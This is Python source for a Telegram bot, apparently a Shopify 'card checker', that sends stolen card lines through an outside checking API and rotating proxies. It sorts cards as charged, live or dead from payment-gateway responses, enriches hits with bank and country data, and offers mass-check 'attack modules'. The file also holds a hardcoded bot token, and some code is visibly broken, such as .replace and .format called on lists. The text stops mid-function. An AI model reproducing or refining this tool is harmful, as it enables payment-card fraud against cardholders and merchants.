import telebot
import requests
import time
import threading
import os
import re
import json
import random
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telebot import types
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from fake_useragent import UserAgent

# ================= CONFIGURATION =================
BOT_TOKEN = "8099467569:AAHF9oYoJnItNylpXBuEvzAbosUtEzZGIRA"
ADMIN_ID = 7959966088
API_URL = "https://shopi-production-7ef9.up.railway.app/"
BIN_API_URL = "https://bins.stormx.pw/bin/"

# 👇 CONFIGURATION ME YE ADD KARO 👇
OWNER_USERNAME = "@BOYSH4RE"      # Apna Username
CHANNEL_LINK = "https://t.me/NEXUSxUPDATES" # Apna Channel Link

# FILES
USERS_FILE = "users.json"
SITES_FILE = "saved_sites.txt"
PROXIES_FILE = "saved_proxies.txt"

# SETTINGS
MAX_SAFE_THREADS = 100
REQUEST_TIMEOUT = 25
VALIDATION_WORKERS = 3

# Code ke shuruwat mein jahan variables define hain
bot = telebot.TeleBot(BOT_TOKEN)
ua = UserAgent()

counter_lock = threading.Lock()
file_lock = threading.Lock() 
active_validation = {}
active_sessions = {}
active_recheck = {}  # <--- YE MISSING THA, ISSE ADD KARO
proxy_dead_alert_sent = {}

# ================= ANIMATION ENGINE =================
def play_anim(chat_id, msg_id, frames, delay=0.3, parse_mode="Markdown"):
    """Message ko animate karta hai with similar nuclear theme"""
    for frame in frames:
        try:
            bot.edit_message_text(frame, chat_id, msg_id, parse_mode=parse_mode)
            time.sleep(delay)
        except: break

# ================= DATABASE & AUTH =================
def load_data(filename, default_type=list):
    if not os.path.exists(filename):
        return [] if default_type == list else {}
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f) if filename.endswith('.json') else [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error loading {filename}: {e}")
        return default_type()

def save_data(filename, data):
    with file_lock:  # <--- YE LOCK ZAROORI HAI
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                if filename.endswith('.json'):
                    json.dump(data, f, indent=4)
                else:
                    f.write("\n".join(data))
        except Exception as e:
            print(f"Error saving {filename}: {e}")

def remove_dead_site(dead_url, chat_id=None):
    # Lock lagaya taaki ek baar me ek hi thread file edit kare
    with file_lock: 
        try:
            current_sites = load_data(SITES_FILE)
            if dead_url in current_sites:
                current_sites.remove(dead_url)
                
                # Manual save logic with lock inside
                with open(SITES_FILE, 'w', encoding='utf-8') as f:
                    f.write("\n".join(current_sites))
                
                if chat_id:
                    # Animated purge message
                    purge_frames = [
                        "☢️ **PURGE INITIATED** ☢️\n──────────────────────────────\n☣ Scanning Target...\n...",
                        "☢️ **PURGE INITIATED** ☢️\n──────────────────────────────\n☣ `{dead_url}` Identified\n...",
                        "☢️ **PURGE INITIATED** ☢️\n──────────────────────────────\n☣ `{dead_url}`\nReason: Dead/Offline\n...",
                        "☢️ **PURGE COMPLETE** ☢️\n──────────────────────────────\n☣ `{dead_url}`\nReason: Dead/Offline\n──────────────────────────────\nDatabase sterilized"
                    ].replace('{dead_url}', dead_url)
                    purge_frames = [frame.replace('{dead_url}', dead_url) for frame in purge_frames]
                    purge_msg = bot.send_message(chat_id, purge_frames[0], parse_mode="Markdown")
                    play_anim(chat_id, purge_msg.message_id, purge_frames, delay=0.5)
            return True
        except Exception as e:
            print(f"Error removing dead site: {e}")
            return False

users_db = load_data(USERS_FILE, dict)
if str(ADMIN_ID) not in users_db:
    users_db[str(ADMIN_ID)] = {"status": "admin", "date": str(datetime.now())}
    save_data(USERS_FILE, users_db)

def is_user_allowed(user_id):
    return str(user_id) in users_db

def user_only(func):
    def wrapper(message):
        if is_user_allowed(message.from_user.id):
            return func(message)
        else:
            try: bot.reply_to(message, "👾 𝐒𝐘𝐒𝐓𝐄𝐌 𝐅𝐀𝐈𝐋𝐔𝐑𝐄\n━━━━━━━━━━━━━━━━━━━━\n❌ Error 403: Forbidden Access\n☠️ User: Unauthorized\n🔌 Connection: 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐓𝐄𝐃")
            except: pass
    return wrapper

def admin_only(func):
    def wrapper(message):
        if str(message.from_user.id) == str(ADMIN_ID):
            return func(message)
    return wrapper

# ================= CORE LOGIC =================
def get_session():
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# Global Cache variable (Top par define karne ki zarurat nahi, yahi ban jayega)
bin_cache = {}

def get_bin_info(cc_num):
    try:
        bin_num = cc_num[:6]
        # Agar BIN pehle se memory me hai, toh wahi se utha lo (Ultra Fast)
        if bin_num in bin_cache:
            return bin_cache[bin_num]

        r = requests.get(BIN_API_URL + bin_num, headers={"User-Agent": ua.random}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            scheme = data.get("scheme", "UNKNOWN").upper()
            c_type = data.get("type", "UNKNOWN").upper()
            country = data.get("country", {}).get("name", "UNKNOWN").upper()
            bank = data.get("bank", {}).get("name", "UNKNOWN").upper()
            
            # Result ko cache (memory) me save kar lo
            result = (scheme, c_type, country, bank)
            bin_cache[bin_num] = result
            return result
            
        return "VISA", "CREDIT", "UNITED STATES", "CHASE BANK"
    except Exception as e:
        return "VISA", "CREDIT", "UNITED STATES", "CHASE BANK"

def normalize_proxy(proxy_str):
    p = proxy_str.strip().replace("http://", "").replace("https://", "")
    if "@" in p:
        try:
            auth, ip_port = p.split("@")
            return f"{ip_port}:{auth}"
        except: return None
    parts = p.split(":")
    if len(parts) == 4 or len(parts) == 2: return p
    return None

def get_my_ip(proxy):
    try:
        if len(proxy.split(":")) == 4:
            ip, port, user, password = proxy.split(":")
            formatted = f"http://{user}:{password}@{ip}:{port}"
        else:
            formatted = f"http://{proxy}"
        r = requests.get("https://checkip.amazonaws.com", proxies={"http": formatted, "https": formatted}, timeout=10)
        if r.status_code == 200: return r.text.strip()
        return None
    except: return None

def check_proxy_rotation(proxy):
    ip1 = get_my_ip(proxy)
    if not ip1: return "DEAD", None
    time.sleep(1.5)
    ip2 = get_my_ip(proxy)
    if not ip2: return "DEAD", None
    if ip1 == ip2: return "STATIC", ip1
    else: return "ROTATING", f"{ip1} -> {ip2}"

def verify_site(url, proxy=None):
    try:
        api_req = f"{API_URL}?cc=5196032154986133|07|27|000&url={urllib.parse.quote(url)}"
        if proxy and proxy != "None":
            api_req += f"&proxy={urllib.parse.quote(proxy)}"
        
        sess = get_session()
        # Timeout badha diya taaki slow internet pe galat result na aaye
        r = sess.get(api_req, timeout=30) 
        
        # Agar API hi down hai (Error 500/404), toh site ko dead mat maano
        if r.status_code != 200:
            return True # Safe side ke liye True bhejo taaki delete na ho

        text = r.text.lower()

        if "site dead" in text:
            return False
        if proxy and "proxy dead" in text:
            return verify_site(url, None)

        # JSON Parse Error Handling
        try:
            json_data = r.json()
            clean_msg = json_data.get("Response", "") or json_data.get("message", r.text)
        except:
            clean_msg = r.text[:100]

        msg_lower = clean_msg.lower()

        live_keywords = [
            "card_declined", "declined", "invalid card", "incorrect_cvc", "incorrect cvc",
            "generic error", "generic_error", "payment failed", "transaction declined",
            "insufficient_funds", "insufficient funds", "do not honor", "gateway rejected",
            "3ds", "3d secure", "suspicious activity",
            "blocked", "blocked for fraud", "risky transaction", "security check failed",
            "avs mismatch", "cvv mismatch", "expired card", "insufficient balance"
        ]

        if any(kw in msg_lower for kw in live_keywords):
            return True
        return False
        
    except Exception as e:
        print(f"Verification Network Error: {e}")
        return True # Error aane par site delete mat karo, assume karo live hai

def extract_content_from_message(message):
    content = []
    target = message.reply_to_message if message.reply_to_message else message
    if target.document:
        try:
            file_info = bot.get_file(target.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            
            # Try UTF-8 first, then fallback to Latin-1 (Crash Proof)
            try:
                decoded = downloaded.decode('utf-8')
            except UnicodeDecodeError:
                decoded = downloaded.decode('latin-1')
                
            content = decoded.splitlines()
        except Exception as e:
            print(f"Error extracting document: {e}")
    elif target.text:
        lines = target.text.splitlines()
        for line in lines:
            if not line.startswith("/"): content.append(line)
    return content

def extract_clean_urls(raw_lines):
    clean = set()
    pat = re.compile(r'(https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[^\s`]*)?)')
    for line in raw_lines:
        matches = pat.findall(line)
        for url in matches:
            clean.add(url.rstrip('.,`)]}'))
    return list(clean)

# ================= CHECKER ENGINE =================
class CheckerSession:
    def __init__(self):
        self.items = []
        self.sites_pool = []
        self.proxy_string = ""
        self.target = ""
        self.total = 0
        self.checked = 0
        self.charged = 0
        self.live = 0
        self.dead = 0
        self.start_time = 0
        self.is_running = False
        self.stop_signal = False
        self.mode = "cc"
        self.dead_sites_count = 0

def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
    if session_obj.stop_signal: return

    max_retries = 5
    attempt = 0
    processed = False

    while attempt < max_retries:
        attempt += 1

        if session_obj.mode in ["mass_cc", "single_quick"]:
            if not session_obj.sites_pool:
                if session_obj.mode == "single_quick":
                    if processing_msg_id:
                        try: bot.delete_message(chat_id, processing_msg_id)
                        except: pass
                    bot.send_message(chat_id, "❌ No Valid Sites Left in DB.")
                return
            target = random.choice(session_obj.sites_pool)
        else:
            target = session_obj.target

        try:
            proxy = session_obj.proxy_string
            encoded_url = urllib.parse.quote(target)
            req_link = f"{API_URL}?cc={cc_line}&url={encoded_url}"
            if proxy:
                req_link += f"&proxy={proxy}"

            sess = get_session()
            resp = sess.get(req_link, headers={"User-Agent": ua.random}, timeout=REQUEST_TIMEOUT)

            raw_text = resp.text.strip()
            resp_lower = raw_text.lower()

            if "proxy dead" in resp_lower:
                if chat_id not in proxy_dead_alert_sent:
                    bot.send_message(chat_id, "🛑 **CRITICAL ALERT: PROXY DEAD**\nChecking Stopped. Please update proxy.")
                    proxy_dead_alert_sent[chat_id] = True
                session_obj.stop_signal = True
                return

            if "site dead" in resp_lower:
                if session_obj.mode == "single_quick":
                    remove_dead_site(target, chat_id)
                else:
                    remove_dead_site(target)
                    session_obj.dead_sites_count += 1
                if target in session_obj.sites_pool:
                    session_obj.sites_pool.remove(target)
                continue

            try:
                json_data = resp.json()
                clean_msg = json_data.get("Response") or json_data.get("message") or raw_text
                gate = json_data.get("Gate", "Shopify")
                amount = json_data.get("Price", "N/A")
            except:
                clean_msg = raw_text[:60]
                gate = "Shopify"
                amount = "N/A"

            msg_lower = clean_msg.lower()
            status = "dead"

            charged_keys = ["order completed", "thank you", "confirmed", "successfully processed", "authorized", "paid", "success", "charge", "approved"]
            live_keys = ["incorrect_cvc", "incorrect cvc", "3ds", "insufficient_funds", "insufficient funds", "do not honor", "gateway rejected"]

            if any(k in msg_lower for k in charged_keys):
                status = "charged"
                with counter_lock: session_obj.charged += 1
            elif any(k in msg_lower for k in live_keys):
                status = "live"
                with counter_lock: session_obj.live += 1
            else:
                status = "dead"
                with counter_lock: session_obj.dead += 1

            is_hit = status in ["charged", "live"]
            should_reply = is_hit or session_obj.mode == "single_quick"

            if should_reply:
                scheme, c_type, country, bank = get_bin_info(cc_line)
                time_taken = round(time.time() - session_obj.start_time, 2)

                header = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if status == "charged" else "𝐋𝐢𝐯𝐞" if status == "live" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
                emoji = "⚡" if status == "charged" else "🔥" if status == "live" else "❌"

                px_display = proxy.split('@')[-1] if "@" in proxy else proxy.split(":")[0] + ":****" if len(proxy.split(":")) == 4 else proxy or "No Proxy"

                final_msg = safe_md(clean_msg)
                final_gate = safe_md(gate)
                final_amount = amount if "\( " in str(amount) or amount == "N/A" else f" \){amount}"  # Fixed

                # Animated Response Frames (Pulsing + Fade)
                anim_frames = [
                    f"{emoji} **{header}** {emoji}\n----------------------------------------\n(🝮︎) Card: `{cc_line}`\n(🝮︎) Status: {header} {emoji}\n(🝮︎) Response: {final_msg}\n(🝮︎) Gateway: {final_gate}\n----------------------------------------\n(🝮︎) Bank: {bank}\n(🝮︎) Type: {scheme} - {c_type}\n(🝮︎) Country: {country}\n(🝮︎) Amount: {final_amount}\n(🝮︎) Time: {time_taken} seconds\n(🝮︎) Proxy IP: {px_display}\n----------------------------------------\n(🝮︎) Developer: BOYS ꭙ H4RE !!",
                    f"{emoji} **{header}** {emoji}\n----------------------------------------\n(🝮︎) Card: `{cc_line}`\n(🝮︎) Status: {header} {emoji}\n(🝮︎) Response: {final_msg}\n(🝮︎) Gateway: {final_gate}\n----------------------------------------\n(🝮︎) Bank: {bank}\n(🝮︎) Type: {scheme} - {c_type}\n(🝮︎) Country: {country}\n(🝮︎) Amount: {final_amount}\n(🝮︎) Time: {time_taken} seconds\n(🝮︎) Proxy IP: {px_display}\n----------------------------------------\n(🝮︎) Developer: BOYS ꭙ H4RE !!",  # Slight pulse effect (emoji repeat)
                ]

                if processing_msg_id:
                    try: bot.delete_message(chat_id, processing_msg_id)
                    except: pass

                # Send first frame, then animate
                hit_msg = bot.send_message(chat_id, anim_frames[0], parse_mode="Markdown")
                play_anim(chat_id, hit_msg.message_id, anim_frames, delay=0.8)

            processed = True
            time.sleep(0.5)
            break

        except Exception as e:
            print(f"Check error: {e}")
            continue

    if not processed:
        with counter_lock: session_obj.dead += 1
        if session_obj.mode == "single_quick":
            if processing_msg_id:
                try: bot.delete_message(chat_id, processing_msg_id)
                except: pass
            bot.send_message(chat_id, "❌ Failed after retries: Network/Timeout Error", parse_mode="Markdown")

    with counter_lock: session_obj.checked += 1
        
def safe_md(text):
    if not text: return ""
    return str(text).replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('(', '\\(').replace(')', '\\)').replace('`', '\\`').replace('>', '\\>').replace('#', '\\#').replace('+', '\\+').replace('-', '\\-').replace('=', '\\=').replace('|', '\\|').replace('{', '\\{').replace('}', '\\}').replace('.', '\\.').replace('!', '\\!')

# ================= COMMANDS =================
@bot.message_handler(commands=['start'])
def welcome(message):
    # Pehle check karega agar user allowed hai
    if is_user_allowed(message.from_user.id):
        # Animated Start UI Frames (Pulsing Diamond + Spinning Loader)
        start_frames = [
            "💠 **𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗡𝗘𝗥𝗩𝗘 𝗖𝗘𝗡𝗧𝗘𝗥**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗽𝗲𝗿𝗮𝘁𝗼𝗿: {name}\n📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻: Secure (TLS 1.3)\n🔋 𝗘𝗻𝗴𝗶𝗻𝗲: Online (v29.0 Final)\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n『 ⚙️ 𝗜𝗡𝗣𝗨𝗧 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 』\n › /seturl ➜ 𝗟𝗼𝗮𝗱 & 𝗩𝗮𝗹𝗶𝗱𝗮𝘁𝗲\n › /setpx ➜ 𝗖𝗼𝗻𝗳𝗶𝗴 𝗣𝗿𝗼𝘅𝘆\n › /getpx ➜ 𝗖𝗵𝗲𝗰𝗸 𝗣𝗿𝗼𝘅𝘆\n › /txtls ➜ 𝗩𝗶𝗲𝘄 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲\n › /delpx ➜ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆\n › /txtrm ➜ 𝗪𝗶𝗽𝗲 𝗗𝗮𝘁𝗮\n › /resites ➜ 𝗥𝗲-𝗖𝗵𝗲𝗰𝗸 𝗦𝗮𝘃𝗲𝗱 𝗦𝗶𝘁𝗲𝘀\n › /support ➜ 𝐋𝐢𝐯𝐞 𝐒𝐮𝐩𝐩𝐨𝐫𝐭\n\n『 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 』\n › /mtxt ➜ ☢️ 𝗠𝗔𝗦𝗦 𝗗𝗘𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡\n › /chk ➜ 🎯 𝐒𝐈𝐍𝐆𝐋𝐄 𝐒𝐍𝐈𝐏𝐄𝐑\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ 𝗦𝘆𝘀𝘁𝗲𝗺 𝗶𝘀 𝗿𝗲𝗮𝗱𝘆 𝗳𝗼𝗿 𝗰𝗼𝗺𝗯𝗼 𝗶𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻.".format(name=safe_md(message.from_user.first_name)),
            "💠 **𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗡𝗘𝗥𝗩𝗘 𝗖𝗘𝗡𝗧𝗘𝗥**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗽𝗲𝗿𝗮𝘁𝗼𝗿: {name}\n📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻: Secure (TLS 1.3)\n🔋 𝗘𝗻𝗴𝗶𝗻𝗲: Online (v29.0 Final)\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n『 ⚙️ 𝗜𝗡𝗣𝗨𝗧 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 』\n › /seturl ➜ 𝗟𝗼𝗮𝗱 & 𝗩𝗮𝗹𝗶𝗱𝗮𝘁𝗲\n › /setpx ➜ 𝗖𝗼𝗻𝗳𝗶𝗴 𝗣𝗿𝗼𝘅𝘆\n › /getpx ➜ 𝗖𝗵𝗲𝗰𝗸 𝗣𝗿𝗼𝘅𝘆\n › /txtls ➜ 𝗩𝗶𝗲𝘄 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲\n › /delpx ➜ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆\n › /txtrm ➜ 𝗪𝗶𝗽𝗲 𝗗𝗮𝘁𝗮\n › /resites ➜ 𝗥𝗲-𝗖𝗵𝗲𝗰𝗸 𝗦𝗮𝘃𝗲𝗱 𝗦𝗶𝘁𝗲𝘀\n › /support ➜ 𝐋𝐢𝐯𝐞 𝐒𝐮𝐩𝐩𝐨𝐫𝐭\n\n『 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 』\n › /mtxt ➜ ☢️ 𝗠𝗔𝗦𝗦 𝗗𝗘𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡\n › /chk ➜ 🎯 𝐒𝐈𝐍𝐆𝐋𝐄 𝐒𝐍𝐈𝐏𝐄𝐑\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ 𝗦𝘆𝘀𝘁𝗲𝗺 𝗶𝘀 𝗿𝗲𝗮𝗱𝘆 𝗳𝗼𝗿 𝗰𝗼𝗺𝗯𝗼 𝗶𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻.".format(name=safe_md(message.from_user.first_name)),  # Pulse effect (repeat line)
        ]
        start_msg = bot.send_message(message.chat.id, start_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, start_msg.message_id, start_frames, delay=1.0)
    
    # 👇 YE WALA PART MISSING THA (Ab Non-Approved user ko ye msg jayega)
    else:
        bot.reply_to(message, "👾 𝐒𝐘𝐒𝐓𝐄𝐌 𝐅𝐀𝐈𝐋𝐔𝐑𝐄\n━━━━━━━━━━━━━━━━━━━━\n❌ Error 403: Forbidden Access\n☠️ User: Unauthorized\n🔌 Connection: 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐓𝐄𝐃")

# ================= PROXY COMMANDS (ANIMATED) =================
@bot.message_handler(commands=['setpx'])
@user_only
def set_px(message):
    if message.reply_to_message:
        raw = extract_content_from_message(message)
        if raw:
            process_proxy_logic(message, raw[0])
        return

    if len(message.text.split()) > 1:
        proxy_data = message.text.split(maxsplit=1)[1]
        process_proxy_logic(message, proxy_data)
        return

    # Animated Setup Prompt
    setup_frames = [
        "🛡️ **ROTATING PROXY SETUP**\n━━━━━━━━━━━━━━━━━━━━━━━━\n📥 Send Proxy:\n⚠️ Bot will verify IP rotation (Strict).",
        "🛡️ **ROTATING PROXY SETUP**\n━━━━━━━━━━━━━━━━━━━━━━━━\n📥 Send Proxy:\n⚠️ Bot will verify IP rotation (Strict)...",
    ]
    msg = bot.send_message(message.chat.id, setup_frames[0], parse_mode="Markdown")
    play_anim(message.chat.id, msg.message_id, setup_frames, delay=1.0)
    bot.register_next_step_handler(msg, lambda m: process_proxy_logic(m, m.text))

def process_proxy_logic(message, proxy_text):
    if not proxy_text: return
    final_proxy = normalize_proxy(proxy_text)
    if not final_proxy:
        # Animated Invalid Format
        invalid_frames = [
            "❌ **Invalid Format.**",
            "❌ **Invalid Format.**\nTry: ip:port:user:pass or ip:port",
        ]
        invalid_msg = bot.send_message(message.chat.id, invalid_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, invalid_msg.message_id, invalid_frames, delay=0.5)
        return

    # Animated Loading
    status_frames = [
        "🕵️ **STEALTH PROTOCOL**\n━━━━━━━━━━━━━━━━━━━━━━━━\n[+] Resolving Host... OK\n[+] Bypassing Firewall... ⏳\n[+] Testing Rotation... ⏳\n\nPlease wait while we secure the node...",
        "🕵️ **STEALTH PROTOCOL**\n━━━━━━━━━━━━━━━━━━━━━━━━\n[+] Resolving Host... OK\n[+] Bypassing Firewall... OK\n[+] Testing Rotation... ⏳\n\nPlease wait while we secure the node...",
        "🕵️ **STEALTH PROTOCOL**\n━━━━━━━━━━━━━━━━━━━━━━━━\n[+] Resolving Host... OK\n[+] Bypassing Firewall... OK\n[+] Testing Rotation... ✅\n\nPlease wait while we secure the node...",
    ]
    status = bot.send_message(message.chat.id, status_frames[0], parse_mode="Markdown")
    play_anim(message.chat.id, status.message_id, status_frames, delay=1.0)
    
    result, details = check_proxy_rotation(final_proxy)
    
    if result == "DEAD":
        dead_frames = [
            "💀 **PROXY TERMINATED** 💀\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚡ Status: Dead / Timeout / Unreachable\n🛑 Node: No Response\n...",
            "💀 **PROXY TERMINATED** 💀\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚡ Status: Dead / Timeout / Unreachable\n🛑 Node: No Response\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ This proxy is offline or blocked.",
            "💀 **PROXY TERMINATED** 💀\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚡ Status: Dead / Timeout / Unreachable\n🛑 Node: No Response\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ This proxy is offline or blocked.\nOnly live rotating proxies are permitted.",
        ]
        bot.edit_message_text(dead_frames[0], message.chat.id, status.message_id, parse_mode="Markdown")
        play_anim(message.chat.id, status.message_id, dead_frames, delay=0.8)
        return
    
    if result == "STATIC":
        reject_frames = [
            "🚫 **PROXY REJECTED** 🚫\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔴 Detection: Static IP Confirmed\n📍 Captured IP: `{details}`\n...",
            "🚫 **PROXY REJECTED** 🚫\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔴 Detection: Static IP Confirmed\n📍 Captured IP: `{details}`\n⚠️ Violation: Non-Rotating Proxy Detected\n...",
            "🚫 **PROXY REJECTED** 🚫\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔴 Detection: Static IP Confirmed\n📍 Captured IP: `{details}`\n⚠️ Violation: Non-Rotating Proxy Detected\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ System Policy:\nOnly High-Anon Rotating Proxies Allowed\nStatic / Datacenter = Instant Reject\n...",
        ]
        reject_text = reject_frames[0].format(details=details)
        bot.edit_message_text(reject_text, message.chat.id, status.message_id, parse_mode="Markdown")
        reject_frames = [frame.format(details=details) for frame in reject_frames]
        play_anim(message.chat.id, status.message_id, reject_frames, delay=0.8)
        return
        
    save_data(PROXIES_FILE, [final_proxy])
    
    # Animated Success
    success_frames = [
        "🛡️ **ANONYMITY NETWORK**\n━━━━━━━━━━━━━━━━━━━━\n[🔓] IP Masking: ACTIVE\n[🔄] Rotation: ENABLED\n[🔌] Node: `{proxy}`\n...",
        "🛡️ **ANONYMITY NETWORK**\n━━━━━━━━━━━━━━━━━━━━\n[🔓] IP Masking: ACTIVE\n[🔄] Rotation: ENABLED\n[🔌] Node: `{proxy}`\n━━━━━━━━━━━━━━━━━━━━\n🟢 Gateway is secure & live.",
    ]
    success_text = success_frames[0].format(proxy=final_proxy)
    bot.edit_message_text(success_text, message.chat.id, status.message_id, parse_mode="HTML")
    success_frames = [frame.format(proxy=final_proxy) for frame in success_frames]
    play_anim(message.chat.id, status.message_id, success_frames, delay=0.5)

@bot.message_handler(commands=['getpx'])
@user_only
def get_px(message):
    proxies = load_data(PROXIES_FILE)
    if not proxies: 
        # Animated No Proxy Error
        no_proxy_frames = [
            "⚠️ **𝐍𝐄𝐓𝐖𝐎𝐑𝐊 𝐄𝐑𝐑𝐎𝐑** ⚠️\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔌 Status: 𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝\n...",
            "⚠️ **𝐍𝐄𝐓𝐖𝐎𝐑𝐊 𝐄𝐑𝐑𝐎𝐑** ⚠️\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔌 Status: 𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝\n🚫 Route: 𝐍𝐨 𝐏𝐫𝐨𝐱𝐲 𝐅𝐨𝐮𝐧𝐝\n\nPlease set up a rotation proxy first.",
        ]
        no_proxy_msg = bot.send_message(message.chat.id, no_proxy_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, no_proxy_msg.message_id, no_proxy_frames, delay=0.6)
        return

    px = proxies[0] 
    status_msg = bot.send_message(message.chat.id, "🔄 **Analyzing Proxy...**", parse_mode="Markdown")
    
    # Animated Analysis
    analysis_frames = [
        "🔄 **Analyzing Proxy...**\n📡 Connecting...\n...",
        "🔄 **Analyzing Proxy...**\n📡 Connecting... ✅\n🔍 IP Rotation Test...\n...",
        "🔄 **Analyzing Proxy...**\n📡 Connecting... ✅\n🔍 IP Rotation Test... ✅\n📊 Status Report...",
    ]
    play_anim(message.chat.id, status_msg.message_id, analysis_frames, delay=0.8)
    
    result, details = check_proxy_rotation(px) 
    
    if result == "ROTATING": 
        icon = "✅ LIVE" 
        desc = "High-Anon Rotating" 
    elif result == "STATIC": 
        icon = "⚠️ STATIC" 
        desc = "Static IP (Not Recommended)" 
    else: 
        icon = "❌ DEAD" 
        desc = "Unreachable" 
        details = "N/A" 
        
    if "@" in px: display = px.split('@')[-1] 
    elif len(px.split(":")) == 4: display = px.split(":")[0] + ":****" 
    else: display = px 
    
    # Animated Status Report
    status_frames = [
        "🛡️ **PROXY STATUS REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔌 Node: `{display}`\n📡 Status: {icon}\n...",
        "🛡️ **PROXY STATUS REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔌 Node: `{display}`\n📡 Status: {icon}\n🔄 Type: {desc}",
    ].format(display=display, icon=icon, desc=desc)
    status_frames = [frame.format(display=display, icon=icon, desc=desc) for frame in status_frames]
    play_anim(message.chat.id, status_msg.message_id, status_frames, delay=0.5)

@bot.message_handler(commands=['delpx'])
@user_only
def delpx(message):
    if os.path.exists(PROXIES_FILE):
        # Animated Flush
        flush_frames = [
            "⚠️ **𝐏𝐑𝐎𝐗𝐘 𝐅𝐋𝐔𝐒𝐇 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━━━━━\n[▓▓▓▓▓▓▓▓▓▓] 100%\n\n✅ 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐑𝐞𝐬𝐞𝐭.\n🗑️ 𝐏𝐫𝐨𝐱𝐢𝐞𝐬 𝐑𝐞𝐦𝐨𝐯𝐞𝐝.",
            "⚠️ **𝐏𝐑𝐎𝐗𝐘 𝐅𝐋𝐔𝐒𝐇 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄**\n━━━━━━━━━━━━━━━━━━━━━━━━\n[▓▓▓▓▓▓▓▓▓▓] 100%\n\n✅ 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐑𝐞𝐬𝐞𝐭.\n🗑️ 𝐏𝐫𝐨𝐱𝐢𝐞𝐬 𝐑𝐞𝐦𝐨𝐯𝐞𝐝.",
        ]
        flush_msg = bot.send_message(message.chat.id, flush_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, flush_msg.message_id, flush_frames, delay=0.7)
        os.remove(PROXIES_FILE)
    else:
        # Animated Empty DB
        empty_frames = [
            "⚠️ **Database already empty.**",
            "⚠️ **Database already empty.**\nNo proxies to flush.",
        ]
        empty_msg = bot.send_message(message.chat.id, empty_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, empty_msg.message_id, empty_frames, delay=0.5)

# ================= SITE VALIDATION (ANIMATED) =================
def build_validation_ui(state, tick=0):
    total = state["total"]
    done = state["done"]
    live = state["live"]
    dead = state["dead"]
    current = state.get("current", "Initializing...")
    response = state.get("response", "Waiting...")

    # Animation Elements
    spinners = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    spin = spinners[tick % len(spinners)]

    if total > 0:
        prog = int((done / total) * 10)
        bar = "▰" * prog + "▱" * (10 - prog)
        percent = int((done / total) * 100)
    else:
        bar = "▱" * 10
        percent = 0

    return (
